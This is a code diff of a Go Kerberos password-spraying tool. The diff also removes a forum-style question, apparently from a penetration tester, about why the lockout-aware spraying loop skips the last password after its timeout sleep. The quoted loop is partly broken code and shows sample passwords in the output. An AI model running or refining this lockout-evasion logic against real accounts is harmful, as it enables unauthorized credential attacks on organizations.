@@ -137,7 +137,7 @@ func main() {
           \|__|  \|__|\|__|\|_______|\|_______|\|__| \|__|
 					          (@Tyl0us)
 
-								`)
+	Version: 3.2							`)
 
 	if opt.enum {
 		services = []string{"KERB"}
@@ -284,6 +284,7 @@ func main() {
 	if opt.pass == "" && opt.passfile != "" {
 		var counter float64
 		counter = 0
+		var username string
 		// Use previous main function but iterate through passwords and automate stuff
 		for _, pwd := range passwords {
 			printDebug("This is the current value of counter: %f\n", counter)
@@ -296,8 +297,8 @@ func main() {
 				err := 0
 				rand.Seed(time.Now().Unix())
 				lenServices := len(services) - 1
-//				for _, username := range usernames {
-				for i := i < len(usernames); i++ {
+				//				for _, username := range usernames {
+				for i := 0; i < len(usernames); i++ {
 					username = usernames[i]
 					n := 0
 					if opt.hostfile != "" {
@@ -480,91 +481,3 @@ func (k KERB) Login() (string, string, error) {
 	forfile := fmt.Sprintf("%s %s %s\\%s:%s = %s", ("[+] "), k.Host, k.User.Domain, k.User.Name, k.User.Password, ("Success"))
 	return result, forfile, nil
 }
-
-
-
-
-I have an additional issue (not pertaining to the above. I can create another thread if needed. Now I am trying to fix functionality in the program. I let it run last night on a client and it worked great except this morning I noticed that when it stopped it did not iterate through the final password and I can't see the logic of where it is failing. It hit the timeout period, waited then did not utilize the last password.
-
-Current end
-[-]  10.1.16.55 [redacted]:stewart145 = Failed
-[-]  10.1.16.56 [redacted]:stewart145 = Failed
-[-]  10.1.16.55 [redacted]:stewart145 = Failed
-
-Hit timeout period - Sleeping for 61 minutes...
-Will resume at 12-08-2022 18:46:37
-
-It should then iterate across the final password. The final password in the list is Truebell145
-
-Here is the code currently (the error was before I added the removal of usernames[i] functionality, and I am not removing passwords at all. I just don't want to waste time each time spraying a username that is already known to be locked.
-    if opt.pass == "" && opt.passfile != "" {
-        var counter float64
-        counter = 0
-        // Use previous main function but iterate through passwords and automate stuff
-        for _, pwd := range passwords {
-            printDebug("This is the current value of counter: %f\n", counter)
-            if counter < opt.attempts {
-                fmt.Print(time.Now().Format("01-02-2006 15:04:05: "))
-                fmt.Printf("Using password: %s\n", pwd)
-                domain := strings.ToUpper(opt.domain)
-                printDebug("Domain %v\tUsernames %v\tPasswords %v\tHosts %v\tServices %v\n", domain, usernames, pwd, hosts, services)
-                x := 0
-                err := 0
-                rand.Seed(time.Now().Unix())
-                lenServices := len(services) - 1
-//                for _, username := range usernames {
-                for i := i < len(usernames); i++ {
-                    username = usernames[i]
-                    n := 0
-                    if opt.hostfile != "" {
-                        n = rand.Int() % (len(hosts) - 1)
-                    }
-                    if hosts[n] == "" {
-                        return
-                    }
-                    sleep := opt.sleep
-                    time.Sleep(time.Duration(sleep) * time.Second)
-                    auth := setup(services[x], hosts[n], domain, username, pwd, opt.enum)
-                    result, forfile, _ := auth.Login()
-                    fmt.Println(result)
-                    if strings.Contains(result, "User's Account Locked") && opt.enum != true {
-                        err++
-                        usernames[i] = usernames[len(usernames)-1]
-                        usernames = usernames[:len(usernames)-1]
-                        i--
-                        if err == int(opt.lockerr) {
-                            reader := bufio.NewReader(os.Stdin)
-                            fmt.Printf("[*] %d Consecutive account lock out(s) detected - Do you want to continue.[y/n]: ", err)
-                            text, _ := reader.ReadString('\n')
-                            if strings.Contains(text, "y") {
-                                err = 0
-                                continue
-                            }
-                            log.Fatal("Shutting down")
-                        }
-                    }
-                    if opt.outFile != "" {
-                        forfile = forfile + "\n"
-                        writefile(opt.outFile, forfile)
-                    }
-                    if lenServices == x {
-                        x = 0
-                    } else {
-                        x++
-                        err = 0
-                    }
-                }
-                counter++
-            } else { //Timeout for the period defined
-                // Printing output with color because why not
-                color.Set(color.FgYellow, color.Bold)
-                fmt.Printf("\nHit timeout period - Sleeping for %v minutes...\n", opt.lockout)
-                fmt.Printf("Will resume at %s", time.Now().Add(time.Duration(opt.lockout)*time.Minute).Format("01-02-2006 15:04:05"))
-                time.Sleep(time.Duration(opt.lockout) * time.Minute)
-                color.Unset()
-                counter = 0
-            }
-        }
-    }
-
-Can you or anyone else identify the issue? From what I am seeing it should still iterate on the last password in the list. but it doesn't.
